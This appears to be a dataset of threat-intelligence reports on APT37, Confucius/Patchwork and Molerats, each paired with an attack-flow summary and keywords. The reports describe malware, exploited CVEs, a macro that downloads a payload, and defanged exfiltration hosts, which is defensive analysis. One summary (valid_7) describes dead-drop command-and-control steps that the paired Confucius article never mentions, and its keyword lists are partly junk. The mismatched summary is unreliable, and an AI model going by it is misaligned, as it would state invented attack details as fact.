"APT37 (REAPER)The Overlooked North Korean ActorPYSPECIAL REPORT2SPECIAL REPORTAPT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR3CONTENTSIntroductionTargeting and MissionInitial Infection VectorsExploited VulnerabilitiesCommand and Control InfrastructureMalwareAttributionOutlook and ImplicationsAppendix: Malware Used by APT373478910121314INTRODUCTIONOn Feb. 2, 2018, we published a blog detailing the use of an Adobe Flash zero-day vulnerability (CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper). Recent examination of this group’s activities by FireEye iSIGHT Intelligence reveals APT37 has expanded its operations in both scope and sophistication. APT37’s toolset, which includes access to zero-day vulnerabilities and wiper malware, combined with heightened tensions in Northeast Asia and North Korea’s penchant for norm breaking, means this group should be taken seriously.We assess with high confidence that this activity is carried out on behalf of the North Korean government given malware development artifacts and targeting that aligns with North Korean state interests. FireEye iSIGHT Intelligence believes that APT37 is aligned with the activity publicly reported as Scarcruft and Group123.4SPECIAL REPORTAPT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR5Targeting and MissionAPT37 has likely been active since at least 2012 and focuses on targeting the public and private sectors primarily in South Korea. In 2017, APT37 expanded its targeting beyond the Korean peninsula to include Japan, Vietnam and the Middle East, and to a wider range of industry verticals, including chemicals, electronics, manufacturing, aerospace, automotive and healthcare entities (Fig. 1).Figure 1. APT37 Targeting Scope.We judge that APT37’s primary mission is covert intelligence gathering in support of North Korea’s strategic military, political and economic interests. This is based on consistent targeting of South Korean public and private entities and social engineering. APT37’s recently expanded targeting scope also appears to have direct relevance to North Korea’s strategic interests.From 2014 to 2017, APT37 targeting concentrated primarily on the South Korean government, military, defense industrial base, and media sector. Lure materials (Fig. 2) typically leveraged the Korean language and featured themes such as Korean peninsula reunification or sanctions.Figure 2. “2016 Korean Reunification Conference Form” company that entered into a joint venture with the North Korean government to provide telecommunications service to the country (read on for a case study). At that time, other targets included individuals involved in international affairs and trade issues, the general director of a Vietnamese international trading and transport company, and possibly individuals working with Olympics organizations assisting in securing resources for athletes.North Korean defector and human rights-related targeting provides further evidence that APT37 conducts operations aligned with the interests of North Korea.APT37 targeted a research fellow, advisory member, and journalist associated with different North Korean human rights issues and strategic organizations. It also targeted an entity in Japan associated with the United Nations missions on sanctions and human rights. APT37 distributed SLOWDRIFT malware using a lure referencing the Korea Global Forum against academic and strategic institutions located in South Korea. Notably, the email was sent from a compromised South Korean institute that conducts studies on North Korea. The string “durihana,” which is also the name of a Christian missionary organization that works with North Korean defectors, was included in an APT37 weaponized document sent to an individual who works with a North Korean human rights organization.CASE STUDY: Targeting of Middle Eastern Organization with Business ties to North KoreaWe believe a Middle Eastern organization was targeted by APT37 because it had been involved with a North Korean company and a business deal went bad. This firm was targeted shortly after media reports of this schism had gone public. The targeting effort may have been an attempt by the North Korean government to gather information on a former business partner. The operation exemplifies APT37’s tactics, techniques and procedures (TTPs), and reflects the advanced capabilities of this espionage group.In May 2017, APT37 used a bank liquidation letter as a spear phishing lure against a board member of a Middle Eastern financial company. The specially crafted email included an attachment containing exploit code for CVE-2017- 0199, a vulnerability in Microsoft Office that had been disclosed just a month earlier. Once opened, the malicious document communicated with a compromised website, most likely to surreptitiously download and install a backdoor called SHUTTERSPEED (MD5: The tool would enable APT37 to collect system information, take screenshots and download additional malicious files to the victim computer.Initial Infection VectorsIn addition to the aforementioned spear phishing tactics, APT37 leverages a variety of methods to deliver malware. These include strategic web compromises typical of targeted cyber espionage operations, as well as the use of torrent file-sharing sites to distribute malware more indiscriminately.Numerous campaigns have employed social engineering tactics tailored specifically to desired targets. Lures and websites of particular interest to South Korean organizations (e.g. reunification) are regularly leveraged in campaigns. Multiple South Korean websites were abused in strategic web compromises to deliver newer variants of KARAE and POORAIM malware. Identified sites included South Korean conservative media and a news site for North Korean refugees and defectors. In one instance, APT37 weaponized a video downloader application with KARAE malware that was indiscriminately distributed to South Korean victims through torrent websites.8SPECIAL REPORTAPT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR9CVE-2018-4878 (Zero-day vulnerability)CVE-2017-0199CVE Release DateExploitCVE-2013-4979CVE-2013-4979CVE-2015-2387CVE-2015-2545CVE-2015-7645CVE-2015-5122CVE-2016-4117CVE-2014-8439CVE-2016-1019CVE-2015-5119CVE-2015-2419CVE-2015-3105FEBJANDEC NOV OCTSEPAUGJULJUN MAY APR MARFEBJANDEC NOV OCTSEPAUGJULJUN MAY APR MARFEBJANDEC NOV OCTSEPAUGJULJUN MAY APR MARFEBJANDEC NOV OCTSEPAUGJULJUN MAY APR MARFEBJAN20182017201620152014Figure 3. Timeline of CVE Release Dates vs. Dates of APT37 CVE Exploitation.Exploited VulnerabilitiesAPT37 frequently exploits vulnerabilities in Hangul Word Processor (HWP) due to the software’s prevalence in South Korea. Further, the group recently demonstrated access to zero-day vulnerabilities (CVE-2018-0802) and has the flexibility to quickly incorporate recently publicized vulnerabilities into spear phishing and strategic web compromise operations. These capabilities suggest a high operational tempo and specialized expertise.APT37 has repeatedly deployed exploits, especially in Flash, quickly after vulnerabilities are initially publicized (see Table 1). CVE-2016-4117, CVE- 2016-1019 and CVE-2015-3043 were all exploited by APT37 in this way. FireEye iSIGHT Intelligence confirmed that since at least November 2017, APT37exploited a zero-day Adobe Flash vulnerability, CVE-2018-4878, to distribute DOGCALL malware to South Korean victims.While use and discovery of zero-day exploits over the past several years has expanded beyond a nation-state dominated environment to include commercial vendors of cyber espionage capabilities and sophisticated financially motivated actors, access to zero-day exploits remains a factor in distinguishing sophisticated or well-resourced actors.Figure 3 details the vulnerabilities exploited by APT37, comparing the time of exploitation to the time the CVE was released.Command and Control InfrastructureAPT37 uses a variety of techniques for command and control. They leverage compromised servers, messaging platforms and cloud service providers to avoid detection. The group often relies on compromised sites to host second stage malware payloads. Over time, APT37 has changed the email providers to set up command and control accounts in a possible attempt to cover their tracks and cause misdirection. These tactics have been refined over the years as APT37 evolves to evade network defenders.APT37 has used various legitimate platforms as command and control for its malware tools. While some early campaigns leveraged POORAIM, which abused AOL Instant Messenger, newer activity deploys DOGCALL, which uses cloud storage APIs such as pCloud and Dropbox.APT37 relies on compromised websites to host second stage malware. Small websites focused on subjects such as aromatherapy and scuba diving have been leveraged, and were most likely compromised opportunistically and made to host malicious payloads.APT37 has improved its operational security over time. For example, early 2015 use of SLOWDRIFT involved credentials associated with Korea related mail servers such as “Daum.net”. Later, in 2015 and early 2016, APT37 pivoted to different email providers such as Gmail and “hmamail.com” in an attempt to anonymize activity. Then from mid-2016 onward, APT37 began using @yandex.com and @ india.com email accounts -- possibly an attempt to cause misattribution.10SPECIAL REPORTAPT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR11MalwareAPT37 employs a diverse suite of malware for initial intrusion and exfiltration. Their malware is characterized by a focus on stealing information from victims, with many set up to automatically exfiltrate data of interest. Figure 4 shows APT37’s malware usage over time. A full breakdown of the malware we associate with APT37, along with how it is detected by FireEye devices, is available in the Appendix.Along with custom malware used for espionage purposes, APT37 also has access to destructive malware. In April 2017, APT37 targeted South Korean military and government organizations with the DOGCALL backdoor and RUHAPPY wiper malware. Although the wiper capability was not used in the identified instance, RUHAPPY can overwrite a machine's Master Boot Record (MBR), causing the system to fail to boot into preconfigured partitions.It is possible that APT37’s distribution of KARAE malware via torrent websites could assist in creating and maintaining botnets for future distributed denial-of-service (DDoS) attacks, or for other activity such as financially motivated campaigns or disruptive operations. Disruptive and destructive cyber threat activity, including the use of wiper malware, public leaks of proprietary materials by false hacktivist personas, DDoS attacks and electronic warfare tactics such as GPS signal jamming is consistent with past behavior by other North Korean actors.2015201620172018JANFEB MAR APR MAYJUNJULAUGSEP OCT NOV DECJANFEB MAR APR MAYJUNJULAUGSEP OCT NOV DECJANFEB MAR APR MAYJUNJULAUGSEP OCT NOV DECJANFigure 4. Timeline of APT37 Malware Use By First and Last Observed Compile Times.KARAESOUNDWAVEZUMKONGRICECURRYCORALDECKPOORAIMSLOWDRIFTMILKDROPGELCAPSULEDOGCALLHAPPYWORKRUHAPPYSHUTTERSPEEDWINERACK12SPECIAL REPORTAPT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR13AttributionWe assess with high confidence that APT37 acts in support of the North Korean government and is primarily based in North Korea. This assessment is based on multiple factors, including APT37’s targeting profile, insight into the group’s malware development and probable links to a North Korean individual believed to be the developer of several of APT37’s proprietary malware families:• An individual we believe to be thedeveloper behind several APT37 malware payloads inadvertently disclosed personal data showing that the actor was operating from an IP address and access point associated with North Korea.• The compilation times of APT37malware is consistent with a developer operating in the North Korea time zone (UTC +8:30) and follows what is believed to be a typical North Korean workday (Fig. 5). The majority of malware compilation times occurred between 10:00 a.m. and 7:00 p.m., witha dip around noon. Additional activity occurred late into the evening. This is consistent with media reporting of extremely long hours for North Korean workers.• The majority of APT37 activitycontinues to target South Korea, North Korean defectors, and organizations and individuals involved in Korean Peninsula reunification efforts. Similarly, APT37 targeting of a Middle Eastern company in 2017 is also consistent with North Korean objectives given the entity’s extensive relationships inside North Korea.12 a.m.1 a.m.2 a.m3 a.m4 a.m5 a.m6 a.m7 a.m8 a.m9 a.m.10 a.m11 a.m.12 p.m.1 p.m.2 p.m.3 p.m.4 p.m.5 p.m.6 p.m.7 p.m.8 p.m.9 p.m.10 p.m.11 p.m.Figure 5. APT37 Compile Times Against Local Time in North Korea.FrequencyOutlook and ImplicationsNorth Korea has repeatedly demonstrated a willingness to leverage its cyber capabilities for a variety of purposes, undeterred by notional redlines and international norms. Though they have primarily tapped other tracked suspected North Korean teams to carry out the most aggressive actions, APT37 is an additional tool available to the regime, perhaps even desirable for its relative obscurity. We anticipate APT37 will be leveraged more and more in previously unfamiliar roles and regions, especially as pressure mounts on their sponsor.The slow transformation of regional actors into global threats is well established. Minor incidents in Ukraine, the Middle East and South Korea have heralded the threats, which are now impossible to ignore. In some cases, the global economy connects organizations to aggressive regional actors. In other cases, a growing mandate draws the actor on to the international stage. Ignored, these threats enjoy the benefit of surprise, allowing them to extract significant losses on their victims, many of whom have never previously heard of the actor.1415Appendix: Malware Used by APT37MalwareDescriptionDetected asMalwareDescriptionDetected asCORALDECKDOGCALLCORALDECK is an exfiltration tool that searches for specified files and exfiltrates them in password protected archives using hardcoded HTTP POST headers. CORALDECK has been observed dropping and using Winrar to exfiltrate data in password protected RAR files as well as WinImage and zip archives.APT.InfoStealer.Win.CORALDECKFE_APT_InfoStealer_Win_ CORALDECK_1MILKDROPPOORAIMDOGCALL is a backdoor commonly distributed as an encoded binary file downloaded and decrypted by shellcode following the exploitation of weaponized documents. DOGCALL is capable of capturing screenshots, logging keystrokes, evading analysis with anti-virtual machine detections, and leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex.FE_APT_RAT_DOGCALLFE_APT_Backdoor_Win32_ DOGCALL_1APT.Backdoor.Win.DOGCALLDOGCALL was used to target South Korean Government and military organizations in March and April 2017.The malware is typically dropped using an HWP exploit in a lure document.The wiper tool, RUHAPPY, was found on some of the systems targeted by DOGCALL. While DOGCALL is primarily an espionage tool, RUHAPPY is a destructive wiper tool meant to render systems inoperable.GELCAPSULEHAPPYWORKGELCAPSULE is a downloader traditionally dropped or downloaded by an exploit document. GELCAPSULE has been observed downloading SLOWDRIFT to victim systems.FE_APT_Downloader_Win32_ GELCAPSULE_1HAPPYWORK is a malicious downloader that can download and execute a second-stage payload, collect system information, and beacon it to the command and control domains. The collected system information includes: computer name, user name, system manufacturer via registry, IsDebuggerPresent state, and execution path.FE_APT_Downloader_ HAPPYWORKFE_APT_Exploit_HWP_HappyDownloader.APT.HAPPYWORKIn November 2016, HAPPYWORK targeted government and financial targets in South Korea.KARAEKarae backdoors are typically used as first-stage malware after an initial compromise. The backdoors can collect system information, upload and download files, and may be used to retrieve a second- stage payload. The malware uses public cloud-based storage providers for command and control.FE_APT_Backdoor_Karae_encFE_APT_Backdoor_KaraeBackdoor.APT.KaraeIn March 2016, KARAE malware was distributed through torrent file-sharing websites for South Korean users. During this campaign, the malware used a YouTube video downloader application as a lure.MILKDROP is a launcher that sets a persistence registry key and launches a backdoor.FE_Trojan_Win32_MILKDROP_1POORAIM malware is designed with basic backdoor functionality and leverages AOL Instant Messenger for command and control communications. POORAIM includes the following capabilities: System information enumeration, File browsing, manipulation and exfiltration, Process enumeration, Screen capture, File execution, Exfiltration of browser favorites, and battery status. Exfiltrated data is sent via files over AIM.POORAIM has been involved in campaigns against South Korean media organizations and sites relating to North Korean refugees and defectors since early 2014.Compromised sites have acted as watering holes to deliver newer variants of POORAIM.RICECURRY is a Javascript based profiler used to fingerprint a victim's web browser and deliver malicious code in return. Browser, operating system, and Adobe Flash version are detected by RICECURRY, which may be a modified version of PluginDetect.RUHAPPY is a destructive wiper tool seen on systems targeted by DOGCALL. It attempts to overwrite the MBR, causing the system not to boot. When victims' systems attempt to boot, the string ""Are you Happy?"" is displayed.The malware is believed to be tied to the developers of DOGCALL and HAPPYWORK based on similar PDB paths in all three.Backdoor.APT.POORAIMExploit.APT.RICECURRYFE_APT_Trojan_Win32_RUHAPPY_1RICECURRYRUHAPPYSHUTTERSPEEDSHUTTERSPEED is a backdoor that can collect system information, acquire screenshots, and download/execute an arbitrary executable. SHUTTERSPEED typically requires an argument at runtime in order to execute fully. Observed arguments used by SHUTTERSPEED include: 'help', 'console', and 'sample'.FE_APT_Backdoor_SHUTTERSPEEDAPT.Backdoor.SHUTTERSPEEDAPT.Backdoor.SHUTTERSPEEDThe spear phishing email messages contained documents exploiting RTF vulnerability CVE-2017-0199.Many of the compromised domains in the command and control infrastructure are linked to South Korean companies. Most of these domains host a fake webpage pertinent to targets.MalwareDescriptionSLOWDRIFTSLOWDRIFT is a launcher that communicates via cloud based infrastructure. It sends system information to the attacker command and control and then downloads and executes additional payloads.Lure documents distributing SLOWDRIFT were not tailored for specific victims, suggesting that TEMP.Reaper is attempting to widen its target base across multiple industries and in the private sector.SLOWDRIFT was seen being deployed against academic and strategic targets in South Korea using lure emails with documents leveraging the HWP exploit.Recent SLOWDRIFT samples were uncovered in June 2017 with lure documents pertaining to cyber crime prevention and news stories. These documents were last updated by the same actor who developed KARAE, POORAIM and ZUMKONG.Detected asFE_APT_Downloader_Win_ SLOWDRIFT_1FE_APT_Downloader_Win_ SLOWDRIFT_2APT.Downloader.SLOWDRIFTSOUNDWAVESOUNDWAVE is a windows based audio capturing utility. Via command line it accepts the -l switch (for listen probably), captures microphone input for 100 minutes, writing the data out to a log file in this format: C:\Temp\HncDownload\ YYYYMMDDHHMMSS.log.FE_APT_HackTool_Win32_ SOUNDWAVE_1ZUMKONGWINERACKZUMKONG is a credential stealer capable of harvesting usernames and passwords stored by Internet Explorer and Chrome browsers. Stolen credentials are emailed to the attacker via HTTP POST requests to mail[.]zmail[.]ru.FE_APT_Trojan_ZumkongTrojan.APT.ZumkongWINERACK is backdoor whose primary features include user and host information gathering, process creation and termination, filesystem and registry manipulation, as well as the creation of a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands. Other capabilities include the enumeration of files, directories, services, active windows and processes.FE_APT_Backdoor_WINERACKBackdoor.APT.WINERACKFireEye, Inc © 2018 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names are or may be trademarks or service marks of their respective owners. SP.APT37.EN-US.22018FireEye, Inc. 601 McCarthy Blvd. Milpitas, CA 95035 408.321.6300 877 FIREEYE (347.3393) info@FireEye.comwww.FireEye.com "," 1. Send spear phishing emails with weaponized documents exploiting vulnerabilities. 2. Documents communicate with compromised servers to download malware like backdoors. 3. Malware extracts system info and data of interest, sending it to command and control infrastructure. 4. C2 infrastructure managed via messaging platforms and cloud services to avoid detection. 5. Stolen data aligned with North Korea's intelligence interests. ",valid_82,"['spear', 'weaponized documents', 'vulnerabilities', 'compromised servers', 'malware', 'backdoors', 'system info', 'data', 'interest', 'Command', 'Control', 'infrastructure', 'platforms', 'Cloud', 'services', 'detection', 'North Korea', 'Intelligence']",spear; weaponized documents; vulnerabilities; compromised servers; malware; backdoors; system info; data; interest; Command; Control; infrastructure; platforms; Cloud; services; detection; North Korea; Intelligence.
"Trend MicroAbout TrendLabs Security Intelligence BlogHomeCategoriesSearch:Home » Targeted Attacks » Confucius Update: New Tools and Techniques, Further Connections with PatchworkFeatured StoriesConfucius Update: New Tools and Techniques, Further Connections with PatchworkPosted on: May 23, 2018 at 5:00 am Posted in: Targeted Attacks Author: Trend Micro Cyber Safety Solutions Team by Daniel Lunghi and Jaromir HorejsiBack in February, we noted the similarities between the Patchwork and Confucius groups and found that, in addition to the similarities in their malware code, both groups primarily went after targets in South Asia. During the months that followed in which we tracked Confucius’ activities, we found that they were still aiming for Pakistani targets.During their previous campaign, we found Confucius using fake romance websites to entice victims into installing malicious Android applications. This time, the threat actor seems to have a new modus operandi, setting up two new websites and new payloads with which to compromise its targets.Fake Android porn app and Windows chat applications as luresConvert webpages or entire websites to PDF - PDFmyURL!systemd Vulnerability Leads to Denial of Service on LinuxqkG Filecoder: Self-Replicating, Document- Encrypting RansomwareMitigating CVE-2017-5689, an Intel Management Engine VulnerabilityA Closer Look at North Korea’s InternetFrom Cybercrime to CyberpropagandaSecurity Predictions for 2018Attackers are banking on network vulnerabilities and inherent weaknesses to facilitate massive malware attacks,The first website uses adult content as a lure, via an Android application called Fuddi Duniya, which links to a website that displays nude pictures every day. The app’s APK is linked directly from the homepage, with a disclaimer stating that Google Play does not allow pornography in their store.Figure 1: fake website with a link to download the Fuddi Duniya app. The displayed Urdu text could be translated as “Real women, girls, and housewives || Download the app now More thanthousands of women app.”The app’s features are similar to the previous malicious Android application, such as having the ability to record audio and steal SMS, accounts, contacts and certain file types from specific directories. In addition, the application now retrieves the last known location and uses the development platform Google Firebase to upload the stolen content.Figure 2: Stealing function excerpt from Fuddi Duniya Android appThe second fake website is again related to chat, with a background suggesting that it can help find users a partner. Initially, a link to a malicious Android application hosted on Google Play that shared the same features as the application described above was present. But after we reached out to Google while carrying out the research, the application was removed from the store and theConvert webpages or entire websites to PDF - PDFmyURL!IoT hacks, and operational disruptions. The ever-shifting threats and increasingly expanding attack surface will challenge users and enterprises to catch up with their security. Read our security predictions for 2018.Business Process CompromiseAttackers are starting to invest in long- term operations that target specific processes enterprises rely on. They scout for vulnerable practices, susceptible systems and operational loopholes that they can leverage or abuse. To learn more, read our Security 101: Business Process Compromise.Recent PostsThe Urpage Connection to Bahamut, Confucius and PatchworkIQY and PowerShell Abused by Spam Campaign to Infect Users in Japan with BEBLOH and URSNIFSupply Chain Attack Operation Red Signature Targets South Korean OrganizationsUse-after-free (UAF) Vulnerability CVE-2018-8373 in VBScript Engine Affects Internet Explorer to Run ShellcodeAugust Patch Tuesday: A Tale of Two Zero-DaysPopular PostsUse-after-free (UAF) Vulnerability CVE-2018-8373 in VBScript Engine Affects Internet Explorer to Run ShellcodeHow Machine Learning Can Help Identify Web Defacement CampaignsMalware Targeting Bitcoin ATMs Pops Up in the UndergroundRansomware as a Service Princess Evolution Looking for AffiliatesAugust Patch Tuesday: A Tale of Two Zero-DaysStay UpdatedEmail SubscriptionYour email hereSubscribelink was removed from the fake website.Figure 3. Screenshot of the second fake websiteSame as with the fake Tweety chat application we described in detail in our previous research, a Windows application with real chat features based on the open-source chat application RocketChat was offered. Similarly, this application also comes bundled with malicious .NET code.While small and relatively simple, we found this malicious application interesting to analyze as it revealed the countries targeted by the threat actor. The application is a simple downloader that sends some basic information (username, antivirus, IP address, and operating system version) encrypted using triple Data Encryption Standard (DES).Convert webpages or entire websites to PDF - PDFmyURL!Figure 4. Sample of the app’s codePeriodically, the malware tries to contact the Command-and-Control (C&C) server with the username encoded into parameters. Based on the information they retrieve, the operators can then decide to instruct the malware to download the second stage payload. This function is similar to the various versions of backdoors (such as sctrls and sip_telephone) that we analyzed in our previous blog post and whitepaper.An interesting feature of the downloader: It uses an online service to retrieve the victim’s IP address and country, which it compares with a list of allowed countries. If the victim seemingly comes from a different country, the program will self-delete and quit. This list contains:Most of the South and Southeast Asian countries (including Mongolia) Most of the Middle Eastern countries Most of the African countries Only Ukraine in Europe Only Trinidad and Tobago in the AmericasConvert webpages or entire websites to PDF - PDFmyURL!No country from OceaniaFigure 5. Excerpt of the valid country listWe noted that it does both client-side and server-side IP filtering, showing that the attacker has improved its infrastructure. At the end of last year, a C&C from the same threat actor was not only accessible from any IP address, but it was possible to browse the server directory tree without authentication.After impersonating a fake victim of interest, we obtained a second stage payload (Detected as TROJ_DELF.XXWZ), which is a filestealer based on the Delphi programming language similar to the “svctrls” malware described in our previous blogpost. This one is called “sysctrls” and it looks for files with the following extensions:ExtensionFile TypeConvert webpages or entire websites to PDF - PDFmyURL!.doc, docx.xls,.xlsx.ppt, .pptx.pptx.png, .jpg, .jpeg.pst, .ost.csvMicrosoft Word documentMicrosoft Excel documentMicrosoft Powerpoint presentationMicrosoft Powerpoint presentationImage fileMicrosoft Outlook fileSpreadsheet fileIt then sends them via a POST HTTP request to windefendr[.]com/description.php.Further analysis of this filestealer revealed interesting links with other threat actor groups.The Delphi LinkWe already mentioned that Confucius had possible links to other groups in our previous blog post, which mentioned code sharing between Patchwork and Confucius. Both groups used a backdoor with the same configuration file structure and commands.We found more code shared among the two threat actor’s malware, as Patchwork recently used multiple Delphi malware similar to some of the Delphi malware we described before.We initially spotted some visual similarities between the malware used. Although no forms are displayed while the malware is running, we can see its TForm object in the Delphi decompiler. The TForm object often has two TTimer objects — but sometimes we have seen one or even three of these objects — usually with random names. Occasionally, listboxes with encrypted strings are structure: A pointer to an encrypted string stored in an EDX register followed by the call to the decryption function.Figure 8: Calling the decryption functionThis encouraged us to analyze the string encryption routines thoroughly.Our analysis revealed three of them. The first involves a very simple routine that flips every bit of the string. The second algorithm involves a hardcoded key, which is transformed by taking the five lower bits of each character, and then used as a XOR key. In some cases, the key is split in half in the binary, so it is first reunited before being used. Finally, our third algorithm uses a 94-character substitution table. This algorithm was previously discussed by security researchers in a Confucius- related blog post.For each of these routines, we found a recent sample going back to a domain name belonging to Patchwork’s infrastructure.The substitution tables of the third algorithm were randomly generated at build time, while the attacker seemingly set the keys used in the second algorithm. We found six different keys in the latter category that were different for the Patchwork and Confucius group.Convert webpages or entire websites to PDF - PDFmyURL!Figure 9. On the left, Confucius code, on the right, Patchwork’s codeInterestingly, one of those keys, “xldbszcd”, was found in a file stealer used by Confucius Detected as TSPY_DELF.SUW) published by security researchers in 2013 and linked to the domain myflatnet[.]com, was attributed by several parties to the Hangover group.The other file stealer TROJ_DELF.XXWZ) is related to a domain reported in September 2016. That report also mentioned InPage software targeting and Delphi backdoors.Convert webpages or entire websites to PDF - PDFmyURL!Figure 10. Left: Confucius group, Middle: Hangover group, Right: Unnamed groupAfter some research, we found multiple Delphi backdoors that used any of the three decryption routines. The backdoors also linked to an infrastructure matching old Hangover domains as well as the infrastructure of domains from the September 2016 blog post. Some of these samples were several years old and had left the original name of the bit-flip decryption algorithm, which was “EnDecrypt”. This algorithm matches the following code snippet.Patchwork’s Ongoing CampaignsAside from their Delphi malware, Patchwork is still active. Lately, they have been sending multiple RTF files exploiting CVE-2017-8570. The dropped payloads are modified versions of the Remote Administration Tool QuasarRAT that can be traced to the domains sastind-cn[.]org and tautiaos[.]com.Figure 11. Process tree after a successful infectionThe attackers sometimes design the weaponized documents to look like legitimate documents ofConvert webpages or entire websites to PDF - PDFmyURL!interest to the target. The documents are also unusually large — often more than 10 megabytes.Figure 12. On the left, the weaponized document. On the right, the legitimate document fromCSBA. Note that the weaponized document was crafted to look like it came from CSBA but doesnot imply that CSBA or its related assets have been compromisedThe group still uses the Badnews malware, a backdoor with information-stealing and file-executing capabilities, albeit updated with a slight modification in the encryption routine at the end of 2017, when they added Blowfish encryption on top of their custom encryption described in our former Patchwork blogpost.Defending against Confucius and PatchworkThreat actors like Confucius and Patchwork are known for their large arsenal of tools and ever- evolving techniques that can render traditional security solutions — which are often not designed to handle the persistent and sophisticated threats detailed in this blog — ineffective. To help combat these kinds of threats organizations will need to take a more proactive and focused security posture that can cover the most ground in terms of security. Some specific security measures organizations can implement:Convert webpages or entire websites to PDF - PDFmyURL!Recognize social engineering attempts. Malicious mobile apps are common infection vectors for cybercriminals, as they can attract specific target audiences. In this case, Confucius went with the common adage “sex sells” Proactively monitor the organization’s network. Threat actors are notorious for creating stealthy malware that can bypass superficial network monitoring. A more proactive stance that includes proper application of firewalls and intrusion detection and prevention systems can help mitigate the impact of an attack Implement network segmentation. Even with the best security technology, there is still a chance of an attack slipping through. Separating the network into individual parts, as well as restricting access to only those who really need it, can mitigate the damage that occurs in case of a successful attack. Update systems regularly. Everything from endpoints to network software to IoT devices should be patched and updated to prevent or minimize the chance of a threat actor exploiting a vulnerabilityIn an ideal scenario, an organization’s in-house security team implement all of these and other security measures. The reality is that IT departments of small to large-sized organizations are not equipped to handle the more advanced threats that groups like Confucius use in their attacks. Since these teams also handle the day-to-day IT requirements of the organization, taking on a more involved and proactive stance may not be easy. In this case, an organization can look into third party security providers who can handle specialized work, such as root cause analysis and detailed research, and also provide a remediation plan that gives organizations a better chance against advanced threats.Trend Micro SolutionsPatchwork uses email as an entry point, which is why securing the email gateway is important. Trend Micro™ Hosted Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network. Trend Micro™ Deep Discovery™ Email Inspector and InterScan™ Web Security prevent malware from ever reaching end users. At the endpoint level, Trend Micro™ Smart Protection Suites deliver several capabilities that minimize the impact of Patchwork’s attacks.These solutions are powered by Trend Micro XGen™ security, which provides a cross- generational blend of threat defense techniques against a full range of threats for dataConvert webpages or entire websites to PDF - PDFmyURL!centers, cloud environments, networks, and endpoints. It features high-fidelity machine learning to secure the gateway and endpoint data and applications, and protect physical, virtual, and cloud workloads.This appendix contains the latest Indicators of Compromise (IOCs) related to the different groups.Updated the appendix on August 30, 2018 to fix formatting and add new informationRelated Posts: Related Posts:Untangling the Patchwork Cyberespionage Group Deciphering Confucius’ Cyberespionage Operations The Urpage Connection to Bahamut, Confucius and Patchwork New Andariel Reconnaissance Tactics Hint At Next TargetsLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE»SMALL BUSINESS»HOME»Tags: ConfuciusDelphiHangoverPatchworkTargeted AttackHOME AND HOME OFFICE |FOR BUSINESS |SECURITY INTELLIGENCE |ABOUT TREND MICROAsia Pacific Region (APAC): Australia / New Zealand, , , 대한민국,  Europe, Middle East, & Africa Region (EMEA): France, Deutschland / Österreich / Schw eiz, Italia, Россия, España, United Kingdom / IrelandLatin America Region (LAR): Brasil, MéxicoNorth America Region (NABU): United States, CanadaConvert webpages or entire websites to PDF - PDFmyURL!Privacy StatementLegal PoliciesCopyright © 2018 Trend Micro Incorporated. All rights reserved.Convert webpages or entire websites to PDF - PDFmyURL! "," 1. The malware is delivered via phishing emails with document or executable attachments pretending to be relevant to the target. 2. When executed, the first stage malware drops additional files and executes scripts to eventually run the second stage backdoor executable. 3. The second stage malware reaches out to legitimate websites like Quora or Yahoo. 4. It scrapes content from specific pages on those sites. 5. A lookup table is used to decode keywords in the scraped content into IP address components. 6. The IP address is assembled and used as the command and control server. 7. The second stage malware uses the command and control server to receive commands, exfiltrate data, etc. 8. New phishing emails are sent to additional targets to propagate the malware further. ",valid_7,"['the malware', 'email', 'document', 'the target', 'first', 'addition', 'files', 'second', 'content', 'us', 'IP address', 'commands', 'targets']",the malware; email; document; the target; first; addition; files; second; content; us; IP address; commands; targets.
"New espionage attack by Molerats APT targeting users in the Middle Eastzscaler.com/blogs/security-research/new-espionage-attack-molerats-apt-targeting-users-middle-eastIntroduction In December 2021, the ThreatLabz research team identified several macro-based MS office files uploaded from Middle Eastern countries such as Jordan to OSINT sources such as VT. These files contained decoy themes related to geo-political conflicts between Israel and Palestine. Such themes have been used in previous attack campaigns waged by the Molerats APT.During our investigation we discovered that the campaign has been active since July 2021. The attackers only switched the distribution method in December 2021 with minor changes in the .NET backdoor. In this blog, we will share complete technical analysis of the attack chain, the C2 infrastructure, threat attribution, and data exfiltration.The targets in this campaign were chosen specifically by the threat actor and they included critical members of banking sector in Palestine, people related to Palestinian political parties, as well as human rights activists and journalists in Turkey.ThreatLabz observed several similarities in the C2 communication and .NET payload between this campaign and the previous campaigns attributed to the Molerats APT group.Additionally, we discovered multiple samples that we suspect are related to Spark backdoor. We have not added the analysis of these samples in this blog, but they were all configured with the same C2 server, which we have included in the IOCs section.Threat attribution1/16We have attributed the attack to Molerats APT group based on following observations:1. Use of open-source as well as commercial packers for the backdoor (ConfuserEx, Themida) 2. Targeting middle-east region 3. Using Dropbox API for entire C2 communication 4. Using RAR files for backdoor delivery as well as in later stages 5. Using other legit cloud hosting services like Google Drive to host the payloads 6. Overlap of domain SSL Certificate thumbprint observed on current attack infrastructure with domains used by Molerats APT group in the past 7. Overlap of Passive DNS resolution of domain observed on current attack infrastructure with the IP used by Molerats APT group in the pastAttack flowFigure 1 below illustrates the new attack chain.Figure 1: Attack chainDecoy content cmd.exe which in turn performs the following operations:1. Executes a PowerShell command to download and drop the Stage-2 payload fromthe URL “url” to the path “C:\ProgramData\document.htm”.2. Renames document.htm to servicehost.exe 3. Executes servicehost.exeFigure 2 below shows the relevant macro codeFigure 2: Macro code[+] Stage-2: servicehost.exe# Static analysisBased on static analysis, we can see that the binary is .NET-based and is obfuscated using the ConfuserEx packer. It masquerades itself as a WinRAR application by using the icon and other resources (which also contains static strings) from the legit WinRAR application.Figure 3: Shows the binary icon and other static information# Dynamic analysisThe main function of the binary is the standard ConfuserEx function which is responsible for loading the runtime module ""koi'' that is stored in encrypted form using a byte array. Once the module is loaded, the main function resolves the module's entry point function using the metadata token and invokes it by providing 